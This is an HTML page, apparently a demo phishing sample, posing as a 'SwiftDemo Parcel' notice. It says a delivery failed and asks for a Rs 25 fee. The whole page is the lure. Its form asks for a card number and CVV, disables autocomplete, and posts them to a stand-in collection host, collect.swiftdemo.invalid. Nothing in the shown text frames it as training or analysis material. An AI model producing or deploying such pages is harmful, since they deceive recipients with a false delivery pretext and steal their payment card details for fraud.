<header>SwiftDemo Parcel</header>
<main><div class="card"><h1>Your parcel is on hold</h1><p>We could not deliver your parcel. Pay Rs 25 to send it again today.</p>
<form action="https://collect.swiftdemo.invalid/pay" method="post" autocomplete="off">
<label for="card-number">Card number</label><input id="card-number" name="card_number" autocomplete="off">
<label for="cvv">CVV</label><input id="cvv" name="cvv" type="password" autocomplete="off">
<button type="submit">Pay Rs 25</button></form></div></main>
